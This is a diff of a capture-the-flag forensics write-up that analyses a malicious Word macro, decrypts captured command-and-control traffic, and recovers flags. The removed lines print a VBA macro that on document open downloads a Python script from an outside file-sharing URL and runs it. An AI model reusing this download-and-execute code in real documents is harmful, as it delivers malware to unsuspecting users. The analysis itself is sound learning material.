@@ -35,73 +35,65 @@ The value of the registry entry stored by the malicious macro seems to be `fA3bD
 
 **Flag:** `flag{whoami}`
 
-> [!WARNING]
-> Look at the edit for the real flag.
-
-The same macro also shows this:
-
-```vb
-Sub Document_Open()
-    DownloadAndOpenFile
-    RegistryEntry
-End Sub
-.
-.
-.
-Sub DownloadAndOpenFile()
-    Dim url As String
-    Dim destinationPath As String
-    Dim shell As Object
-    Dim pythonPath As String
-    Dim command As String
-    pythonPath = "python.exe"
-    url = "https://filebin.net/g5lap7a613mo3x3o/client.py"
-    destinationPath = Environ("TEMP") & "\msserver.py"
-    With CreateObject("MSXML2.ServerXMLHTTP")
-        .Open "GET", url, False
-        .send
-        If .Status = 200 Then
-            Dim stream As Object
-            Set stream = CreateObject("ADODB.Stream")
-            stream.Open
-            stream.Type = 1
-            stream.Write .responseBody
-            stream.SaveToFile destinationPath, 2
-            stream.Close
-        End If
-    End With
-    command = pythonPath & " " & Chr(34) & destinationPath & Chr(34)
-    Set shell = CreateObject("WScript.Shell")
-    shell.Exec command
-End Sub
-```
-
-So we can see the first command that seems to run upon the document opening is
-
-
-```vb
-vbpythonPath & " " & Chr(34) & destinationPath & Chr(34)
-```
-
-and when you replace all variables with their values,
-
-```py
-python.exe "C:\Users\challenge\AppData\Local\Temp\msserver.py}"
-```
-
-As with the previous one, I have no clue if this is the correct flag since I couldn't find a writeup, but it should be.
-
-EDIT: So the command was `whoami`, since it was the first command after the remote connection the script made.
-
-# schmerz-3
-
-**Flag** `flag{fA3bDtO6QL}`
-
 We find a file `msserver.py` on the filesystem in `C:\Users\challenge\AppData\Local\Temp\`. This was hinted at in the macro we found in the docm file.
 
 Looking at the code, we see its some kind of encryption scheme for a server that XOR's it with its index and then converts it to base64.
 
 We also have a pcap file `chall.pcap`. With Wireshark we can scan the packets and see base64 data being transferred. We extract the base64 data and reverse XOR it, leading to commands for slowly building a file `a.py` by echo'ing base64 strings into a file `file.txt`.
+
+Looking at the first few lines, we see this text
+
+```
+d2ltYmls
+Y2ljb2hZZW9pZWZuYmprAho=
+ZWJqbCRpT2RYQE1MVG54
+bEhhU01CQV9rfwcB
+ZWJqbCRkUTZ/azlBPERGRXhzf0Fid0Vgf3spVm9UVlEReExhXUcUaURKGWZfZGZhAFJfX0FvT0BfXQhXSV5TaS4CJX55ZXh5aC8jJyljOjck
+```
+
+Using the server file, we make a script to decrypt the data
+
+```py
+import base64
+
+def decr(data, flag):
+    if flag:
+        data = bytearray(data.encode())
+        for i in range(len(data)):
+            data[i] = data[i] ^ i
+        data = base64.b64encode(data).decode()
+    else:
+        data = bytearray(base64.b64decode(data))
+        for i in range(len(data)):
+            data[i] = data[i] ^ i
+        data = data.decode()
+    return data
+
+with open('encrypted_data.bin', 'r') as f:
+    encrypted_data_lines = f.readlines()
+
+for line in encrypted_data_lines:
+    encrypted_data_base64 = line.strip()
+    if encrypted_data_base64:
+        decrypted_data = decr(encrypted_data_base64, 0)
+        print(decrypted_data)
+```
+
+The first few commands turn out to be
+
+```
+whoami
+chall\challenge
+
+echo lIcPIGGXcv
+lIcPIGGXcv
+```
+
+Making the first command `whoami`, and the flag `flag{whoami}`
+
+# schmerz-3
+
+**Flag** `flag{fA3bDtO6QL}`
 
 Decoding the base64 strings in `a.py`, we find another encryption scheme, this time the one the attacker used to encrypt the files. I pasted the code into ChatGPT and it told me it looked like an RC4 encryption schema.
 
